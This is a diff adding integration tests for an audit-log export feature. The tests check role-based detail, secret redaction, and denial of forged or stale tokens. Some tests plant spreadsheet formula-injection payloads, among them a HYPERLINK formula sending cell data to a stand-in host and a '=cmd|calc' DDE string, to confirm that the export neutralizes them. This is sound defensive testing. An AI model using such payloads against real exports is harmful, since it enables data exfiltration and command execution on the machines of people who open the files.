@@ -507,4 +507,185 @@ describe('audit export is safe and faithful (ST-71.3)', () => {
             expect(csv.rows.map((row) => row[6])).toEqual(['42']);
         });
     });
+
+    describe('events produced by real requests', () => {
+        const around = () => ({ from: new Date(Date.now() - 600_000).toISOString(), to: new Date(Date.now() + 60_000).toISOString() });
+        const strong = 'Passw0rd!Strong1';
+
+        it('exports a creation and a denial as they happened, without the password, the email or the name', async () => {
+            const body = (suffix: string) => ({
+                fullName: `Persona Privada ${suffix}`, username: `${h.prefix}-${suffix}`, email: `${h.prefix}-${suffix}@privado.test`,
+                password: strong, roleId: h.roles.driver,
+            });
+            const created = h.call('post', '/users', tokens.admin, body('real'));
+            const createdRes = await created.response;
+            expect(createdRes.status).toBe(201);
+            const denied = h.call('post', '/users', tokens.coordinator, body('refused'));
+            expect((await denied.response).status).toBe(403);
+
+            const expected = [
+                { correlationId: created.correlationId, cells: [String(h.users.admin.id), 'admin', 'user.created', 'user', String(createdRes.body.id), 'Exitoso', '201'] },
+                { correlationId: denied.correlationId, cells: [String(h.users.coordinator.id), 'coordinator', 'user.created', 'user', '', 'Denegado', '403'] },
+            ];
+            for (const { correlationId, cells } of expected) {
+                for (const who of ['admin', 'root'] as const) {
+                    const csv = await csvOf(who, { ...around(), correlationId });
+                    expect(csv.rows).toHaveLength(1);
+                    expect(csv.rows[0]!.slice(2, 9)).toEqual(cells);
+                    const pdf = await pdfOf(who, { ...around(), correlationId });
+                    expectPdfRows(pdf.rows, await searchAll(who, { ...around(), correlationId }), who === 'root');
+                    for (const file of [squash(csv.res.text), pdf.text]) {
+                        for (const secret of [strong, '@privado.test', squash('Persona Privada'), tokens.admin, tokens.coordinator]) {
+                            expect(file).not.toContain(secret);
+                        }
+                    }
+                }
+            }
+        });
+
+        // Anyone can write into the trail: a denied request keeps the id of its path, before any authentication.
+        it('neutralizes a formula planted without a token through the path of a protected endpoint', async () => {
+            const payload = '=HYPERLINK("http://x.test/"&A1,"ver")';
+            const planted = h.call('delete', `/users/${encodeURIComponent(payload)}`, null);
+            expect((await planted.response).status).toBe(401);
+            expect((await h.eventsOf(planted.correlationId))[0]!.entity_id).toBe(payload);
+
+            const csv = await csvOf('admin', { ...around(), correlationId: planted.correlationId });
+            expect(csv.rows[0]![6]).toBe(`'${payload}`);
+            expect(csv.all.flat().filter((cell) => FORMULA_START.test(cell))).toEqual([]);
+        });
+
+        it.each(['x;=1+1', 'x;"=1+1', 'x\n=1+1'])('neutralizes %j, planted without a token, for readers that split elsewhere', async (payload) => {
+            const planted = h.call('delete', `/users/${encodeURIComponent(payload)}`, null);
+            expect((await planted.response).status).toBe(401);
+            expect((await h.eventsOf(planted.correlationId))[0]!.entity_id).toBe(payload);
+
+            const csv = await csvOf('admin', { ...around(), correlationId: planted.correlationId });
+            expect(csv.rows[0]![6]).toBe(payload.replace('=', "'="));
+            expect(semicolonCells(csv.res.text).filter((cell) => /^[=+\-@\t]/.test(cell))).toEqual([]);
+        });
+
+        it('neutralizes a request id chosen by the client that starts with a sign', async () => {
+            const correlationId = `-2.${h.prefix}`;
+            try {
+                const res = await request(h.app.getHttpServer()).delete(`/${h.api}/users/1`).set('X-Request-Id', correlationId);
+                expect(res.status).toBe(401);
+                const csv = await csvOf('admin', { ...around(), correlationId });
+                expect(csv.rows[0]![9]).toBe(`'${correlationId}`);
+                expect(csv.context).toContainEqual(['Filtro: Correlación', `'${correlationId}`]);
+            } finally {
+                await h.db.query('DELETE FROM admin_audit_events WHERE correlation_id = $1', [correlationId]);
+            }
+        });
+
+        it('does not list an export inside its own file; the next one does', async () => {
+            const reviewer = await createUser('admin', 'reviewer');
+            const query = () => ({ ...around(), actorId: reviewer.id });
+            const own = async () => {
+                const { correlationId, response } = h.call('get', '/audit/admin-events/export', reviewer.token);
+                const res = await response.query({ ...query(), format: 'csv' });
+                expect(res.status).toBe(200);
+                return { correlationId, rows: readCsv(res.text).rows };
+            };
+            const first = await own();
+            expect(first.rows).toEqual([]);
+            const second = await own();
+            expect(second.rows.map((row) => [row[4], row[9]])).toEqual([['audit.exported', first.correlationId]]);
+        });
+    });
+
+    describe('what a caller is not authorized to get', () => {
+        const noRecords = (res: { status: number; headers: Record<string, string>; body: unknown; text?: string }) => {
+            expect(res.headers['content-disposition']).toBeUndefined();
+            expect(res.headers['content-type']).toMatch(/json/);
+            expect(JSON.stringify(res.body)).not.toMatch(/00000000-0000-4000-a713|10\.20\.30\.40|2001:db8/);
+        };
+        const denials = (userId: number) => h.db.query(
+            `SELECT result, status_code FROM admin_audit_events WHERE action = 'audit.exported' AND actor_user_id = $1`, [userId],
+        );
+
+        it('the files of the administrator carry no address and no declared field anywhere; those of root do', async () => {
+            const secrets = ['10.20.30.40', '2001:db8::77', 'segundo renglón', '=cmd|calc', '"roleId"', 'Dirección IP', 'Campos declarados'];
+            const csv = (await csvOf('admin')).res.text;
+            const pdf = (await pdfOf('admin')).text;
+            for (const secret of secrets) {
+                expect(csv).not.toContain(secret);
+                expect(pdf).not.toContain(squash(secret));
+            }
+            const rootPdf = (await pdfOf('root')).text;
+            for (const secret of ['10.20.30.40', '2001:db8::77', 'segundorenglón', '=cmd|calc', 'DirecciónIP', 'Camposdeclarados']) {
+                expect(rootPdf).toContain(squash(secret));
+            }
+        });
+
+        it('root and the administrator exporting at the same time each get their own detail', async () => {
+            const [rootPdf, adminPdf, rootCsv, adminCsv] = await Promise.all([pdfOf('root'), pdfOf('admin'), csvOf('root'), csvOf('admin')]);
+            expect(rootPdf.text).toContain('10.20.30.40');
+            expect(adminPdf.text).not.toContain('10.20.30.40');
+            expect(rootCsv.columns).toEqual(ROOT_COLUMNS);
+            expect(adminCsv.columns).toEqual(COLUMNS);
+            expect(adminCsv.res.text).not.toContain('10.20.30.40');
+        });
+
+        it('an extra parameter cannot ask for the detail of another role', async () => {
+            const res = await call('/audit/admin-events/export', tokens.admin, { ...window, format: 'csv', role: 'root' });
+            expect(res.status).toBe(400);
+            noRecords(res);
+        });
+
+        it.each([
+            ['an invalid request', { format: 'xlsx', from: 'x' }],
+            ['a result over the maximum', { format: 'pdf', from: '2019-03-09T00:00:00-04:00', to: '2019-03-10T00:00:00-04:00' }],
+        ])('a role without permission gets 403 for %s, not a hint about it', async (_name, query) => {
+            const res = await call('/audit/admin-events/export', tokens.supervisor, { ...window, ...query });
+            expect(res.status).toBe(403);
+            expect(res.body.error).toBe('INSUFFICIENT_PERMISSIONS');
+            noRecords(res);
+        });
+
+        it('a token with a forged signature gets 401', async () => {
+            const [header, payload, signature] = tokens.root.split('.');
+            const forged = `${header}.${payload}.${signature!.startsWith('A') ? 'B' : 'A'}${signature!.slice(1)}`;
+            const res = await call('/audit/admin-events/export', forged, { ...window, format: 'csv' });
+            expect(res.status).toBe(401);
+            noRecords(res);
+        });
+
+        it.each([
+            ['demoted to coordinator', 'UPDATE users SET role_id = (SELECT role_id FROM roles WHERE name = \'coordinator\') WHERE user_id = $1', 403, 'INSUFFICIENT_PERMISSIONS'],
+            ['deactivated', 'UPDATE users SET active = false WHERE user_id = $1', 401, 'INVALID_TOKEN'],
+            ['forced to change the password', 'UPDATE users SET requires_pwd_change = true WHERE user_id = $1', 403, 'PASSWORD_CHANGE_REQUIRED'],
+        ] as const)('an administrator %s after the token was issued gets no file', async (name, change, status, error) => {
+            const user = await createUser('admin', `lost-${name.split(' ')[0]}`);
+            expect((await exportFile(user.token, 'csv', {})).status).toBe(200);
+            await h.db.query(change, [user.id]);
+            for (const format of ['csv', 'pdf'] as const) {
+                const res = await call('/audit/admin-events/export', user.token, { ...window, format });
+                expect(res.status).toBe(status);
+                expect(res.body.error).toBe(error);
+                noRecords(res);
+            }
+            if (status === 403) {
+                // PasswordChangeGuard records without waiting for the insert.
+                await vi.waitFor(async () => expect((await denials(user.id)).filter((row: { result: string }) => row.result === 'denied')).toHaveLength(2));
+            }
+        });
+
+        it('a PDF that fails to render sends no file, is audited as failed and leaves the CSV and the next PDF working', async () => {
+            const user = await createUser('admin', 'render');
+            const render = vi.spyOn(h.app.get(PdfPort, { strict: false }), 'generate').mockRejectedValueOnce(new PdfGenerationException('boom 10.20.30.40'));
+            try {
+                const res = await call('/audit/admin-events/export', user.token, { ...window, format: 'pdf' });
+                expect(res.status).toBe(500);
+                expect(res.headers['content-disposition']).toBeUndefined();
+                expect(res.headers['content-type']).toMatch(/json/);
+                expect(res.body.error).toBe('PDF_GENERATION_FAILED');
+                expect(await denials(user.id)).toEqual([{ result: 'failed', status_code: 500 }]);
+                expect((await exportFile(user.token, 'csv', {})).status).toBe(200);
+                expect((await exportFile(user.token, 'pdf', {})).status).toBe(200);
+            } finally {
+                render.mockRestore();
+            }
+        });
+    });
 });
